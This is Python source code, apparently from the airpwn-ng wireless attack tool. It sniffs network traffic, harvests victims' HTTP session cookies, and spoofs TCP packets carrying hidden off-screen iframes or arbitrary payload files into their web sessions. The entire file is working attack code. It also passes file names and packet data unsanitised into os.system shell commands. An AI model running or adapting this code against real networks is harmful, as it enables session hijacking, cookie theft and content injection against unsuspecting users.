from threading import Thread
from Queue import Queue, Empty
from scapy.all import *

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class VictimParameters:
	def __init__(self,*positional_parameters, **keyword_parameters):
		if ('websites' in keyword_parameters):
			self.websites=keyword_parameters['websites']
		else:
			self.websites=None
		if ('inject_file' in keyword_parameters):
			self.inject_file=keyword_parameters['inject_file']
		else:
			self.inject_file=None

		if ('in_request' in keyword_parameters):
			self.in_request=keyword_parameters['in_request']
		else:
			self.in_request=None
		if (self.websites is None and self.inject_file is None and self.in_request is None):
			print "[ERROR] Please specify victim parameters"
			exit(1)
		if (self.websites is not None):
			self.website_injects=[]
			for website in self.websites:
				self.website_injects.append((website,self.get_iframe(website,"0")))
		if (self.inject_file is not None):
			self.file_inject=self.load_injection(self.inject_file)
			self.file_injected=0


	def create_iframe(self,website,id):
	        iframe='''<iframe id="iframe'''+id+'''" width="1" scrolling="no" height="1" frameborder="0" src=""></iframe>\n'''
	        return iframe

	def load_injection(self,injectionfile):
	        #Check if file TEMPLOG exists, throw error if true, proceed if false
	        proceed=0
	        try:
	                f = open('TEMPLOG','r')
	                proceed=0
	        except IOError:
	                proceed=1
	        if (proceed==0):
	                print bcolors.WARNING+"[!] You have a file named TEMPLOG in this directory. Please rename it, as it is used by airpwn-ng for payload generation"
	                exit(1)
	
	        #Uses bash to hex encode payload (--by stryngs)
	        cmd='''echo "0x$(cat '''+injectionfile+''' | xxd -g1 -ps | fold -w2 | paste -sd ' ')" > TEMPLOG'''
	        os.system(cmd)
	        f = open('TEMPLOG','r')
	        inject=f.read().strip()
	        f.close()
	        os.system("rm TEMPLOG")
	        return inject


	def create_iframe_injection(self,injects):
	        proceed=0
	        try:
	                f = open('INJECTS_TEMP','r')
	                proceed=0
	        except IOError:
	                proceed=1
	        if (proceed==0):
	                print bcolors.WARNING+"[!] You have a file named INJECTS_TEMP in this directory. Please rename it, as it is used by airpwn-ng for payload generation"
	                exit(1)
	        f = open('INJECTS_TEMP','w')
	        f.write('\n')
	        f.write('''<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n''')
	        f.write('''<html xmlns="http://www.w3.org/1999/xhtml">\n''')
	        f.write('''<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">\n''')
	        f.write(injects)
	        f.write('</div>')
	        f.close()
	        global injection
	        injection=self.load_injection('INJECTS_TEMP')
#	        os.system("cat INJECTS_TEMP")
	        os.system("rm INJECTS_TEMP")
	        return injection

	def get_iframe(self,website,i):
                #THIS GENERATES AN IFRAME WITH EMPTY SRC, TO BE FILLED IN LATER IN JAVASCRIPT TO BYPASS SOME RESTRICTIONS
                iframes=self.create_iframe(website,str(i))
                iframes+='''<script>\n'''
                iframes+='''function setIframeSrc'''+str(i)+'''() {\n'''
                iframes+='''var s = "'''+website+'''";\n'''
                iframes+='''var iframe1 = document.getElementById('iframe'''+str(i)+'''');\n'''
                iframes+='''if ( -1 == navigator.userAgent.indexOf("MSIE") ) {\n'''
                iframes+='''iframe1.src = s;\n'''
                iframes+='''}\nelse {\n'''
                iframes+='''iframe1.location = s;\n'''
                iframes+=''' }\n}\ntry{\nsetTimeout(setIframeSrc'''+str(i)+''', 10);\n} catch (err){\n}\n'''
                iframes+='''</script>\n'''
                injection=self.create_iframe_injection(iframes)
		return injection

#	def load_inject_file(self):
		



class Victim:
	def __init__(self,*positional_parameters, **keyword_parameters):
		if ('ip' in keyword_parameters):
			self.ip=keyword_parameters['ip']
		else:
			self.ip=None

		if ('mac' in keyword_parameters):
			self.mac=keyword_parameters['mac']
		else:
			self.mac=None
		if ('victim_parameters' in keyword_parameters):
			self.victim_parameters=keyword_parameters['victim_parameters']
		else:
			self.victim_parameters=None

		if (self.ip is None and self.mac is None):
			print "[ERROR] Victim: No IP or Mac, or in_request selected"
			exit(1)

		if (self.victim_parameters is None):
			print "[ERROR] Please create VictimParameters for this Victim"
			exit(1)

		self.cookies=[]

	def get_injection(self):
		if (self.victim_parameters.websites is not None):
			for website in self.victim_parameters.websites:
				exists=0
				for cookie in self.cookies:
					if (cookie[0] in website):
						exists=1
				if (not exists):
					for inject in self.victim_parameters.website_injects:
						if (inject[0]==website):
#							print inject[0]
							return inject[1]

		if (self.victim_parameters.inject_file is not None):
			if (self.victim_parameters.file_injected==0):
				return self.victim_parameters.file_inject


	def check_add_cookie(self,cookie):
		exists=0
		for existing_cookie in self.cookies:
			if (existing_cookie[0] == cookie[0]):
				exists=1
		if (not exists):
			print "[+] New cookie detected for ",self.mac
			print cookie
			self.cookies.append(cookie)

	def add_cookie(self,cookie):
		if (self.victim_parameters.websites is not None):
			for website in self.victim_parameters.websites:
				if (cookie[0] in website):
					self.check_add_cookie(cookie)
		else:
			self.check_add_cookie(cookie)

class Injector:
	def __init__(self,interface):
		self.interface=interface

	#TODO: CHANGE OS.SYSTEM CALL TO SUBPROCESS POPEN SO YOU CAN CHECK PACKIT'S RET CODE HANDLE IT
	def inject(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection):
		cmd='nice -n -20 packit -i '+self.interface+' -R -nnn -a '+str(acknum)+' -D '+str(vicport)+' -F PA -q '+str(seqnum)+' -S '+str(svrport)+' -d '+vicip+' -s '+svrip+' -X '+rtrmac+' -Y '+vicmac+' -p "'
		cmd+=injection
		#TODO: ALLOW FOR DEBUG MODE WHERE YOU CAN SEE PACKIT'S OUTPUT
		cmd+='" >/dev/null 2>&1'
		print bcolors.OKBLUE+"[*] Injecting Packet to victim "+vicmac+bcolors.ENDC
		os.system(cmd)


class PacketHandler:
	def __init__(self,*positional_parameters, **keyword_parameters):
		if ('victims' in keyword_parameters):
                        self.victims=keyword_parameters['victims']
		else:
			self.victims=[]
		if ('excluded' in keyword_parameters):
			self.excluded=keyword_parameters['excluded']
		else:
			self.excluded=None

		if ('handler' in keyword_parameters):
			self.handler=keyword_parameters['handler']
		else:
			self.handler=None
		if ('i' in keyword_parameters):
                        self.i=keyword_parameters['i']
		else:
			self.i=None
		if ('victim_parameters' in keyword_parameters):
			self.victim_parameters=keyword_parameters['victim_parameters']
		else:
			self.victim_parameters=None

		if (self.i is None):
			print "[ERROR] No injection interface selected"
			exit(1)
		if (len(self.victims)==0 and self.victim_parameters is None):
			print "[ERROR] Please specify victim parameters or Victim List"
			exit(1)
		self.newvictims=[]
		self.injector=Injector(self.i)

	def search_cookie(self,ret2):
		if (len(ret2.strip())>0):
			arr=ret2.split("\n")
			host=""
			cookie=""
#			print ret2
			for line in arr:
				if ('Cookie' in line):
					cookie=line
				if ('Host' in line):
					host=line.split()[1]
			if (len(host)!=0 and len(cookie)!=0):
				return [host,cookie]
			else:
				return None
		else:
			return None

	def get_request(self,pkt):
		ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
		if (len(ret2.strip())>0):
#			print ret2.translate(None,"'").strip()
			return ret2.translate(None,"'").strip()
		else:
			return None

	def handle_default(self,packet):
		if (packet.haslayer(IP) and packet.haslayer(TCP)):
			#MONITOR MODE
			if (packet.haslayer(Dot11) and not packet.haslayer(Ether)):
				vicmac=packet.getlayer(Dot11).addr2
				rtrmac=packet.getlayer(Dot11).addr1
			#TAP MODE
			else:
				vicmac=packet.getlayer(Ether).src
				rtrmac=packet.getlayer(Ether).dst
			vicip=packet.getlayer(IP).src
			svrip=packet.getlayer(IP).dst
			vicport=packet.getlayer(TCP).sport
			svrport=packet.getlayer(TCP).dport
			size=len(packet.getlayer(TCP).load)
			acknum=str(int(packet.getlayer(TCP).seq)+size)
			seqnum=packet.getlayer(TCP).ack
			request=self.get_request(packet)
			cookie=self.search_cookie(request)
#			print (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
			return (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)


	def process(self,interface,pkt):
		if (self.handler is not None):
			self.handler(self,interface,pkt)
		else:
			vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie=self.handle_default(pkt)
			if (len(self.victims)==0):
				if (cookie is not None):
					exists=0
					for victim in self.newvictims:
						if (victim.ip is not None):
							if (victim.ip==vicip):
								victim.add_cookie(cookie)
								exists=1
						else:
							if (victim.mac is not None):
								if (victim.mac.lower()==vicmac.lower()):
									victim.add_cookie(cookie)
									exists=1
					if (exists==0):
#						print "here"
						v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
						v1.add_cookie(cookie)
						self.newvictims.append(v1)
				else:
					exists=0
					for victim in self.newvictims:
						if (victim.ip is not None):
							if (victim.ip==vicip):
								exists=1
						else:
							if (victim.mac is not None):
								if (victim.mac.lower()==vicmac.lower()):
									exists=1
					if (exists==0):
						v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
						self.newvictims.append(v1)
				if (self.excluded is not None):
					for host in self.excluded:
						if (svrip in host):
							return 0
				for victim in self.newvictims:
					if (victim.ip is not None):
						if (victim.ip==vicip):
							injection=victim.get_injection()
							if (injection is not None):
								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
					else:
						if (victim.mac is not None):
							if (victim.mac.lower()==vicmac.lower()):
								injection=victim.get_injection()
								if (injection is not None):
									self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
			else:
				if (cookie is not None):
					for victim in self.victims:
						if (victim.ip is not None):
							if (victim.ip==vicip):
								victim.add_cookie(cookie)
						else:
							if (victim.mac is not None):
								if (victim.mac.lower()==vicmac.lower()):
									victim.add_cookie(cookie)
				if (self.excluded is not None):
					for host in self.excluded:
						if (svrip in host):
							return 0
				for victim in self.victims:
					if (victim.ip is not None):
						if (victim.ip==vicip):
							injection=victim.get_injection()
							if (injection is not None):
								print vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection
								self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)
					else:
						if (victim.mac is not None):
							if (victim.mac.lower()==vicmac.lower()):
								injection=victim.get_injection()
								if (injection is not None):
									self.injector.inject(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection)

	
class Sniffer:
	def __init__(self,packethandler,*positional_parameters, **keyword_parameters):
		if ('filter' in keyword_parameters):
                        self.filter=keyword_parameters['filter']
		else:
			self.filter=None
		if ('m' in keyword_parameters):
                        self.m=keyword_parameters['m']
		else:
			self.m=None
		if (self.m is None):
			print "[ERROR] No monitor interface selected"
			exit()
		if (self.filter is None):
			if ("mon" not in self.m):
				print "[WARN] SNIFFER: Filter empty for non-monitor interface"
		self.packethandler=packethandler

	def sniff(self,q):
		if ("mon" in self.m):
			sniff(iface = self.m, prn = lambda x : q.put(x))
		else:
			sniff(iface = self.m,filter = self.filter, prn = lambda x : q.put(x))

	def threaded_sniff(self):
		q = Queue()
		sniffer = Thread(target = self.sniff, args=(q,))
		sniffer.daemon = True
		sniffer.start()
		while True:
			try:
				pkt = q.get(timeout = 1)
				self.packethandler.process(self.m,pkt)
				q.task_done()
			except Empty:
				pass
